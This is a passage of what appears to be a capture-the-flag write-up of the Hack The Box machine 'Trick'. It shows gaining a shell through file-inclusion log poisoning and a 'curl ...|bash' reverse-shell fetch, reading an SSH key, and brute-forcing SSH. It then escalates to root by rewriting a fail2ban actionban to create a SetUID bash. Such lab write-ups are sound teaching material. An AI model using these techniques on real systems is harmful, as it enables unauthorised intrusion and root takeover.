oxdf@hacky$ chmod 600 ~/keys/trick-michael
oxdf@hacky$ ssh -i ~/keys/trick-michael michael@trick.htb
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
michael@trick:~$ 

```

### Shell Via Log Poisoning

Using the LFI in the marketing page, I can also read the NGINX access logs:

[![image-20221027102405426](https://0xdfimages.gitlab.io/img/image-20221027102405426.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20221027102405426.png)

The user agent is logged there, so I’ll send something with a webshell in it:

![image-20221027103012501](https://0xdfimages.gitlab.io/img/image-20221027103012501.png)

I’ll include the string 0xdf to find within the potentially large log. Now I’ll include the log again, and this time there’s execution:

[![image-20221027103154643](https://0xdfimages.gitlab.io/img/image-20221027103154643.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20221027103154643.png)

To get a shell, I’ll use `&cmd=curl+10.10.14.6/s|bash` , and host a simple [Bash Reverse Shell](https://www.youtube.com/watch?v=OjkVep2EIlw) with a Python webserver.

### Shell Via SSH Key Read

With the file include as michael, and `id_rsa` is a default name for a private key, there’s no reason I can’t just read that SSH key, skipping the LFI remote code execution:

![image-20221015071233762](https://0xdfimages.gitlab.io/img/image-20221015071233762.png)

## Shell as root

### Enumeration

#### sudo

The first thing I always check when getting on a Linux host is what programs this user can run as another user with `sudo`:

```

michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart

```

In this case, michael can restart `fail2ban` as root.

#### security Group

michael is also in the `security` group:

```

michael@trick:~$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)

```

This group is not a standard Linux thing. I’ll look for files that michael can access that are in that group using the `find` command. It’s important to send errors to `/dev/null` (ignore them) otherwise every file or folder that michael can’t access will throw an error.

```

michael@trick:~$ find / -group security 2>/dev/null
/etc/fail2ban/action.d

```

There’s only one folder, and it’s `fail2ban` related. Looking more closely this group has full control over the directory:

```

michael@trick:~$ ls -ld /etc/fail2ban/action.d/
drwxrwx--- 2 root security 4096 Oct 15 16:18 /etc/fail2ban/action.d/

```

There are a bunch of files already in it:

```

michael@trick:~$ ls /etc/fail2ban/action.d/
abuseipdb.conf     cloudflare.conf            firewallcmd-ipset.conf         hostsdeny.conf          iptables-ipset-proto4.conf           iptables-xt_recent-echo.conf  mynetwatchman.conf       npf.conf        sendmail-buffered.conf             sendmail-whois-ipmatches.conf  symbiosis-blacklist-allports.conf
apf.conf           complain.conf              firewallcmd-multiport.conf     ipfilter.conf           iptables-ipset-proto6-allports.conf  mail-buffered.conf            netscaler.conf           nsupdate.conf   sendmail-common.conf               sendmail-whois-lines.conf      ufw.conf
badips.conf        dshield.conf               firewallcmd-new.conf           ipfw.conf               iptables-ipset-proto6.conf           mail.conf                     nftables-allports.conf   osx-afctl.conf  sendmail.conf                      sendmail-whois-matches.conf    xarf-login-attack.conf
badips.py          dummy.conf                 firewallcmd-rich-logging.conf  iptables-allports.conf  iptables-multiport.conf              mail-whois-common.conf        nftables-common.conf     osx-ipfw.conf   sendmail-geoip-lines.conf          shorewall.conf
blocklist_de.conf  firewallcmd-allports.conf  firewallcmd-rich-rules.conf    iptables-common.conf    iptables-multiport-log.conf          mail-whois.conf               nftables-multiport.conf  pf.conf         sendmail-whois.conf                shorewall-ipset-proto6.conf
bsd-ipfw.conf      firewallcmd-common.conf    helpers-common.conf            iptables.conf           iptables-new.conf                    mail-whois-lines.conf         nginx-block-map.conf     route.conf      sendmail-whois-ipjailmatches.conf  smtp.py

```

#### fail2ban

To test if `fail2ban` will ban me, I’ll run `crackmapexec` bruteforcing michael’s account over SSH:

```

oxdf@hacky$ crackmapexec ssh trick.htb -u oxdf -p /usr/share/wordlists/rockyou.txt 
SSH         trick.htb       22     trick.htb        [*] SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
SSH         trick.htb       22     trick.htb        [-] oxdf:123456 Authentication failed.
SSH         trick.htb       22     trick.htb        [-] oxdf:12345 Authentication failed.
SSH         trick.htb       22     trick.htb        [-] oxdf:123456789 Authentication failed.
SSH         trick.htb       22     trick.htb        [-] oxdf:password Authentication failed.
SSH         trick.htb       22     trick.htb        [-] oxdf:iloveyou Authentication failed.
SSH         trick.htb       22     trick.htb        [-] oxdf:princess Authentication failed.
SSH         trick.htb       22     trick.htb        [-] oxdf:1234567 [Errno None] Unable to connect to port 22 on 10.10.11.166
SSH         trick.htb       22     trick.htb        [-] oxdf:rockyou [Errno None] Unable to connect to port 22 on 10.10.11.166
SSH         trick.htb       22     trick.htb        [-] oxdf:12345678 [Errno None] Unable to connect to port 22 on 10.10.11.166
SSH         trick.htb       22     trick.htb        [-] oxdf:abc123 [Errno None] Unable to connect to port 22 on 10.10.11.166
SSH         trick.htb       22     trick.htb        [-] oxdf:nicole [Errno None] Unable to connect to port 22 on 10.10.11.166
^C
[*] Shutting down, please wait...

```

After a few failures, it switches to “Unable to connect to port 22 on 10.10.11.166”. I’ve been blocked.

### fail2ban Configuration

I’ve written about `fail2ban` before. In [AdmirerToo](/2022/05/28/htb-admirertoo.html#rce), I used `fail2ban` combined with abusing `whois` configs to get a execution as root in a very complex way. The “[HoHo…No](/holidayhack2021/8#terminal---hoho--no)” terminal in the 2021 SANS Holiday Hack is devoted to understanding `fail2ban` as well (my [video solution](https://www.youtube.com/watch?v=GnHKQ-FixfM) does a nice intro as well). There’s also a nice article from Jan 2021 called [Privileges Escalation via fail2ban](https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/) that goes over a lot of this as well.

Before I abuse `fail2ban`, I’ll want to understand how it’s configured. There’s three parts to a `fail2ban` configuration:
- A filter defines the patterns to look for in a given log file.
- An action defines something that can happen (like an `iptables` rule being put in place).
- A jail connects a filter to an action.

Looking in `/etc/fail2ban/jail.conf`, there’s a `sshd` section:

```

[sshd]

# To use more aggressive sshd modes set filter parameter "mode" in jail.local:
# normal (default), ddos, extra or aggressive (combines all).
# See "tests/files/logs/sshd" or "filter.d/sshd.conf" for usage example and details.
#mode   = normal
port    = ssh
logpath = %(sshd_log)s
backend = %(sshd_backend)s
bantime = 10s

```

There’s also a `[DEFAULT]` section that applies to all services unless overridden:

```

[DEFAULT]
...[snip]...
# "bantime" is the number of seconds that a host is banned.
bantime  = 10s

# A host is banned if it has generated "maxretry" during the last "findtime"
# seconds.
findtime  = 10s

# "maxretry" is the number of failures before a host get banned.
maxretry = 5
...[snip]...
banaction = iptables-multiport
banaction_allports = iptables-allports
...[snip]...

```

The default action is to run `iptables-multiport`.

Looking at `/etc/fail2ban/action.d/iptable-multiport.conf`, the important line is the `actionban`, which runs each time an IP hits the defined threshold:

```

...[snip]...
# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
...[snip]...

```

### Abusing fail2ban

At this point, I have all I need to get execution as root. I’ll start by changing the `actionban` in `/etc/fail2ban/action.d/iptables-multipath.conf` to make a copy of `bash` and set it SetUID:

```

# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = cp /bin/bash /tmp/0xdf; chmod 4777 /tmp/0xdf

```

Now I’ll restart `fail2ban`:

```

michael@trick:/etc/fail2ban$ sudo /etc/init.d/fail2ban restart
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.

```

Finally, I need to trigger the ban:

```

oxdf@hacky$ crackmapexec ssh trick.htb -u oxdf -p /usr/share/wordlists/rockyou.txt 
SSH         trick.htb       22     trick.htb        [*] SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
SSH         trick.htb       22     trick.htb        [-] oxdf:123456 Authentication failed.
SSH         trick.htb       22     trick.htb        [-] oxdf:12345 Authentication failed.
SSH         trick.htb       22     trick.htb        [-] oxdf:123456789 Authentication failed.
SSH         trick.htb       22     trick.htb        [-] oxdf:password Authentication failed.
SSH         trick.htb       22     trick.htb        [-] oxdf:iloveyou Authentication failed.
SSH         trick.htb       22     trick.htb        [-] oxdf:princess Authentication failed.                         
SSH         trick.htb       22     trick.htb        [-] oxdf:1234567 Authentication failed.
SSH         trick.htb       22     trick.htb        [-] oxdf:rockyou Authentication failed.
SSH         trick.htb       22     trick.htb        [-] oxdf:12345678 Authentication failed.
SSH         trick.htb       22     trick.htb        [-] oxdf:abc123 Authentication failed.
SSH         trick.htb       22     trick.htb        [-] oxdf:nicole Authentication failed.
SSH         trick.htb       22     trick.htb        [-] oxdf:daniel Authentication failed.
SSH         trick.htb       22     trick.htb        [-] oxdf:babygirl Authentication failed.
SSH         trick.htb       22     trick.htb        [-] oxdf:monkey Authentication failed.
SSH         trick.htb       22     trick.htb        [-] oxdf:lovely Authentication failed.
SSH         trick.htb       22     trick.htb        [-] oxdf:jessica Authentication failed.
SSH         trick.htb       22     trick.htb        [-] oxdf:654321 Authentication failed.
SSH         trick.htb       22     trick.htb        [-] oxdf:michael Authentication failed.
SSH         trick.htb       22     trick.htb        [-] oxdf:ashley Authentication failed.
SSH         trick.htb       22     trick.htb        [-] oxdf:qwerty Authentication failed.  
...[snip]...

```

I’ll notice that this time I don’t get blocked. That’s because even when the `actionban` runs, it doesn’t block my IP in `iptables`, but rather creates a SetUID `bash`. That file exists:

```

michael@trick:/etc/fail2ban$ ls -l /tmp/0xdf
-rwsrwxrwx 1 root root 1168776 Oct 15 18:17 /tmp/0xdf

```

To trigger this, I’ll need to run it with `-p` (see [this video](https://www.youtube.com/watch?v=XvfpOIAMx6Y) for details on uid vs euid and why I need `-p` for `bash`). That gives a shell (with effective uid) as root:

```

michael@trick:/etc/fail2ban$ /tmp/0xdf -p
0xdf-5.0# id
uid=1001(michael) gid=1001(michael) euid=0(root) groups=1001(michael),1002(security)

```

And from there I can read `root.txt`:

```

0xdf-5.0# cat /root/root.txt
3c3ef61f************************

```